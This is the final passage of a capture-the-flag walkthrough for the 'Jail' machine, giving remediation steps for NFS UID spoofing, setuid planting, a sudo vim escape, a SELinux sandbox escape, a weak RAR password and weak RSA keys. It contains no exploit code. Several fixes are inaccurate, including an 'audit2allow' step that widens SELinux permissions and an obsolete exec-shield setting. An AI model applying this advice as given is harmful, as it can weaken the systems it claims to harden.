</span></span></code></pre></div></li><li><strong>Enable NX Bit</strong>: Ensure the system enforces the NX (No-eXecute) bit to prevent execution of code on the stack. Verify with:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sysctl kernel.exec-shield<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span></code></pre></div></li></ul></li></ul><p><strong>Vulnerability 5</strong>: Firewall blocks reverse shells but allows socket reuse</p><ul><li><strong>Description</strong>: The iptables configuration blocks outbound reverse shells but does not prevent socket reuse, allowing attackers to gain a shell over the existing connection.</li><li><strong>Fix Type</strong>: Configuration fix</li><li><strong>Remediation</strong>:<ul><li><strong>Strengthen Firewall Rules</strong>: Block all unnecessary outbound connections and restrict inbound connections to specific services:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>iptables -A INPUT -p tcp --dport <span style=color:#ae81ff>7411</span> -j ACCEPT
</span></span><span style=display:flex><span>iptables -A OUTPUT -p tcp --sport <span style=color:#ae81ff>7411</span> -j ACCEPT
</span></span><span style=display:flex><span>iptables -A OUTPUT -j DROP
</span></span></code></pre></div></li><li><strong>Monitor Connections</strong>: Use tools like <code>tcpdump</code> or <code>netstat</code> to monitor and log connections on port 7411, ensuring only legitimate traffic is allowed.</li><li><strong>Implement Application-Level Security</strong>: Modify the application to validate and sanitize socket input/output to prevent unauthorized commands.</li></ul></li></ul><h3 id=3-nfs-service-port-111-version-3>3. NFS Service (Port 111, Version 3)<a href=#3-nfs-service-port-111-version-3 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Vulnerability 1</strong>: User ID spoofing</p><ul><li><strong>Description</strong>: NFS version 3 allows user ID spoofing, enabling an attacker to impersonate a user (e.g., UID 1000 for <code>frank</code>) and create setuid binaries.</li><li><strong>Fix Type</strong>: Configuration fix</li><li><strong>Remediation</strong>:<ul><li><strong>Upgrade to NFSv4</strong>: Use NFS version 4 with Kerberos authentication to enforce user-based access controls:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>yum install nfs-utils
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;/opt *(rw,sync,sec=krb5p)&#34;</span> &gt; /etc/exports
</span></span><span style=display:flex><span>exportfs -ra
</span></span></code></pre></div></li><li><strong>Enable Root Squash</strong>: Ensure <code>root_squash</code> is enabled (already present in this case) and consider <code>all_squash</code> to map all users to an anonymous UID:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;/var/nfs_share *(rw,sync,all_squash,anonuid=65534,anongid=65534)&#34;</span> &gt; /etc/exports
</span></span><span style=display:flex><span>exportfs -ra
</span></span></code></pre></div></li><li><strong>Restrict NFS Access</strong>: Limit NFS mounts to specific IP addresses or subnets in <code>/etc/exports</code>:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;/var/nfs_share 192.168.1.0/24(rw,sync)&#34;</span> &gt; /etc/exports
</span></span><span style=display:flex><span>exportfs -ra
</span></span></code></pre></div></li><li><strong>Use Firewall Rules</strong>: Restrict NFS traffic to trusted hosts:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>iptables -A INPUT -p tcp --dport <span style=color:#ae81ff>111</span> -s 192.168.1.0/24 -j ACCEPT
</span></span><span style=display:flex><span>iptables -A INPUT -p tcp --dport <span style=color:#ae81ff>111</span> -j DROP
</span></span></code></pre></div></li></ul></li></ul><p><strong>Vulnerability 2</strong>: Writable NFS share allows setuid binary creation</p><ul><li><strong>Description</strong>: The <code>/var/nfs_share</code> directory is writable by the <code>frank</code> user (UID 1000), allowing attackers to create setuid binaries to escalate privileges.</li><li><strong>Fix Type</strong>: Configuration fix</li><li><strong>Remediation</strong>:<ul><li><strong>Restrict Write Permissions</strong>: Modify the NFS share to be read-only or limit write access to specific users:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;/var/nfs_share *(ro,sync)&#34;</span> &gt; /etc/exports
</span></span><span style=display:flex><span>exportfs -ra
</span></span></code></pre></div></li><li><strong>Disable Setuid on NFS</strong>: Mount the NFS share with the <code>nosuid</code> option to prevent setuid binaries from being executed:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mount -t nfs -o vers<span style=color:#f92672>=</span>3,nosuid <span style=color:#f92672>[</span>TARGET-IP<span style=color:#f92672>]</span>:/var/nfs_share /mnt/nfs_share
</span></span></code></pre></div></li><li><strong>Audit File Permissions</strong>: Regularly audit NFS share permissions to ensure only authorized users have write access:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find /var/nfs_share -perm /u+s,g+s -type f -exec rm <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span>
</span></span></code></pre></div></li></ul></li></ul><h3 id=4-selinux-sandbox>4. SELinux Sandbox<a href=#4-selinux-sandbox class=hanchor arialabel=Anchor>#</a></h3><p><strong>Vulnerability</strong>: Command injection via terminal input buffer stuffing</p><ul><li><strong>Description</strong>: A CVE allows attackers to escape the SELinux sandbox by stuffing the terminal input buffer with commands executed post-sandbox.</li><li><strong>Fix Type</strong>: Configuration fix</li><li><strong>Remediation</strong>:<ul><li><strong>Apply SELinux Updates</strong>: Ensure the system is running the latest SELinux policies and kernel updates to patch known vulnerabilities:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>yum update selinux-policy kernel
</span></span></code></pre></div></li><li><strong>Strengthen SELinux Policy</strong>: Configure a stricter SELinux policy to limit the capabilities of confined processes. Create a custom policy module to restrict terminal access:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>audit2allow -M jailrestrict -i /var/log/audit/audit.log
</span></span><span style=display:flex><span>semodule -i jailrestrict.pp
</span></span></code></pre></div></li><li><strong>Disable Unnecessary Contexts</strong>: Remove or restrict the SELinux context used by the <code>jail</code> application if it&rsquo;s not needed.</li><li><strong>Monitor SELinux Logs</strong>: Regularly review <code>/var/log/audit/audit.log</code> for suspicious activity and adjust policies accordingly.</li></ul></li></ul><h3 id=5-sudo-configuration>5. Sudo Configuration<a href=#5-sudo-configuration class=hanchor arialabel=Anchor>#</a></h3><p><strong>Vulnerability</strong>: Misconfigured <code>sudo</code> permissions for <code>vim</code></p><ul><li><strong>Description</strong>: The <code>frank</code> user can run <code>sudo -u adm vim /opt/logreader/logread.sh</code>, allowing execution of arbitrary commands via <code>vim</code>&rsquo;s <code>:python</code> escape.</li><li><strong>Fix Type</strong>: Configuration fix</li><li><strong>Remediation</strong>:<ul><li><strong>Use <code>sudoedit</code> Instead of <code>vim</code></strong>: Modify the <code>sudoers</code> file to use <code>sudoedit</code> for editing files, which restricts execution capabilities:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;frank ALL=(adm) sudoedit /opt/logreader/logread.sh&#34;</span> &gt; /etc/sudoers.d/frank
</span></span></code></pre></div></li><li><strong>Restrict Commands</strong>: Limit <code>sudo</code> to specific, non-interactive commands:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;frank ALL=(adm) /bin/cat /opt/logreader/logread.sh&#34;</span> &gt; /etc/sudoers.d/frank
</span></span></code></pre></div></li><li><strong>Use <code>noexec</code> Option</strong>: Apply the <code>noexec</code> mount option or <code>sudo</code> restriction to prevent execution of binaries from <code>vim</code>:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;frank ALL=(adm) NOEXEC:/usr/bin/vim /opt/logreader/logread.sh&#34;</span> &gt; /etc/sudoers.d/frank
</span></span></code></pre></div></li><li><strong>Audit Sudo Permissions</strong>: Regularly review <code>/etc/sudoers</code> and <code>/etc/sudoers.d/*</code> for overly permissive rules:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>visudo -c
</span></span></code></pre></div></li></ul></li></ul><h3 id=6-file-system-encrypted-rar-file>6. File System (Encrypted RAR File)<a href=#6-file-system-encrypted-rar-file class=hanchor arialabel=Anchor>#</a></h3><p><strong>Vulnerability</strong>: Weak password for encrypted RAR file</p><ul><li><strong>Description</strong>: The <code>/var/adm/keys.rar</code> file uses a weak password (<code>Morris1962!</code>), guessable due to a note revealing the format (<code>&lt;lastname>&lt;4digits>&lt;symbol></code>).</li><li><strong>Fix Type</strong>: Configuration fix</li><li><strong>Remediation</strong>:<ul><li><strong>Enforce Strong Passwords</strong>: Use a stronger, randomly generated password (e.g., 20+ characters, mixed case, numbers, symbols) for encrypted files.</li><li><strong>Remove Sensitive Notes</strong>: Delete or secure <code>/var/adm/note.txt</code> to prevent attackers from learning the password format:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>shred -u /var/adm/note.txt
</span></span></code></pre></div></li><li><strong>Restrict File Access</strong>: Change permissions to prevent unauthorized access:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chown adm:adm /var/adm/keys.rar
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> /var/adm/keys.rar
</span></span></code></pre></div></li><li><strong>Use Stronger Encryption</strong>: Replace RAR with a more secure encryption tool (e.g., GPG) with stronger algorithms:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gpg -c --cipher-algo AES256 keys
</span></span></code></pre></div></li></ul></li></ul><p><strong>Vulnerability</strong>: Insecure storage of SSH keys</p><ul><li><strong>Description</strong>: The <code>root_authorized_ssh_key.pub</code> is stored in an encrypted RAR file, and the private key is recoverable via the Wiener attack due to weak RSA parameters.</li><li><strong>Fix Type</strong>: Configuration fix</li><li><strong>Remediation</strong>:<ul><li><strong>Use Strong RSA Parameters</strong>: Generate SSH keys with secure parameters (e.g., 4096-bit RSA or Ed25519):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519
</span></span></code></pre></div></li><li><strong>Secure Key Storage</strong>: Store private keys in a hardware security module (HSM) or encrypted vault rather than on the file system.</li><li><strong>Restrict Key Access</strong>: Ensure SSH key files have strict permissions:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chown root:root /root/.ssh/authorized_keys
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> /root/.ssh/authorized_keys
</span></span></code></pre></div></li></ul></li></ul><h3 id=7-system-wide-configurations>7. System-Wide Configurations<a href=#7-system-wide-configurations class=hanchor arialabel=Anchor>#</a></h3><p><strong>Vulnerability 1</strong>: Weak ASLR implementation</p><ul><li><strong>Description</strong>: The system&rsquo;s ASLR can be bypassed due to the debug mode leaking memory addresses, and GDB debugging affects ASLR behavior.</li><li><strong>Fix Type</strong>: Configuration fix</li><li><strong>Remediation</strong>:<ul><li><strong>Enable Full ASLR</strong>: Ensure ASLR is fully enabled:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#ae81ff>2</span> &gt; /proc/sys/kernel/randomize_va_space
</span></span></code></pre></div></li><li><strong>Restrict Debugging</strong>: Limit GDB access to authorized users:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chown root:root /usr/bin/gdb
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>750</span> /usr/bin/gdb
</span></span></code></pre></div></li><li><strong>Use Hardened Kernels</strong>: Deploy a kernel with enhanced security features (e.g., grsecurity or PaX) to strengthen ASLR.</li></ul></li></ul><p><strong>Vulnerability 2</strong>: Permissive file system permissions</p><ul><li><strong>Description</strong>: The <code>/var/nfs_share</code> directory allows the <code>frank</code> user to create files, and the unintended <code>adm</code> escalation relies on writable NFS directories.</li><li><strong>Fix Type</strong>: Configuration fix</li><li><strong>Remediation</strong>:<ul><li><strong>Restrict Directory Permissions</strong>: Ensure sensitive directories are not writable by unprivileged users:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chown root:root /var/nfs_share
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>755</span> /var/nfs_share
</span></span></code></pre></div></li><li><strong>Audit Setuid Binaries</strong>: Regularly scan for unauthorized setuid binaries:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -perm /u+s,g+s -type f -exec ls -l <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span>
</span></span></code></pre></div></li><li><strong>Use Mandatory Access Controls</strong>: Enforce stricter SELinux or AppArmor policies to limit file system access.</li></ul></li></ul><p><strong>Vulnerability 3</strong>: Non-login shell for <code>adm</code> user</p><ul><li><strong>Description</strong>: The <code>adm</code> user has a non-login shell (<code>/sbin/nologin</code>), but attackers can still escalate privileges via <code>sudo</code> or NFS exploits.</li><li><strong>Fix Type</strong>: Configuration fix</li><li><strong>Remediation</strong>:<ul><li><strong>Remove Unnecessary Accounts</strong>: If the <code>adm</code> user is not needed for interactive logins, ensure it cannot be used for privilege escalation:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>usermod -s /sbin/nologin adm
</span></span></code></pre></div></li><li><strong>Audit Account Permissions</strong>: Regularly review <code>/etc/passwd</code> and <code>/etc/group</code> for misconfigured accounts:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /etc/passwd | grep -v nologin
</span></span></code></pre></div></li></ul></li></ul><h3 id=summary-of-fixes>Summary of Fixes<a href=#summary-of-fixes class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Apache Web Server</strong>: Restrict directory access, disable indexing, and add authentication.</li><li><strong>Custom Application (jail.c)</strong>: Replace <code>strcpy</code> with <code>strncpy</code>, remove hard-coded credentials, eliminate debug mode, disable executable stack, and strengthen firewall rules.</li><li><strong>NFS Service</strong>: Upgrade to NFSv4, enforce <code>root_squash</code> and <code>nosuid</code>, restrict access by IP, and limit write permissions.</li><li><strong>SELinux</strong>: Apply updates, strengthen policies, and monitor logs.</li><li><strong>Sudo</strong>: Use <code>sudoedit</code>, restrict commands, and apply <code>noexec</code>.</li><li><strong>File System</strong>: Enforce strong passwords, secure SSH keys, and restrict file permissions.</li><li><strong>System-Wide</strong>: Enable full ASLR, restrict debugging, audit setuid binaries, and enforce strict file system permissions.</li></ul><p>These fixes address the identified vulnerabilities by applying secure coding practices, tightening configurations, and enforcing system-wide security policies. Implementing these remediations would significantly reduce the attack surface of the &ldquo;Jail&rdquo; machine.</p><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>#</a></h2><p>Jail is an excellent machine that demonstrates the complexity of custom binary exploitation and multi-layered privilege escalation. It requires expertise in:</p><ul><li>Source code analysis and custom binary reverse engineering</li><li>Buffer overflow exploitation with modern protections</li><li>NFS security misconfigurations and user ID spoofing</li><li>SELinux sandbox escape techniques</li><li>SSH key management and cryptographic attacks</li><li>Multiple privilege escalation vectors through system misconfigurations</li><li>Advanced penetration testing methodologies</li></ul><p>The machine emphasizes the importance of secure coding practices, proper system configuration, and comprehensive security auditing in preventing complex attack chains.</p><hr><p><em>This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.</em></p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>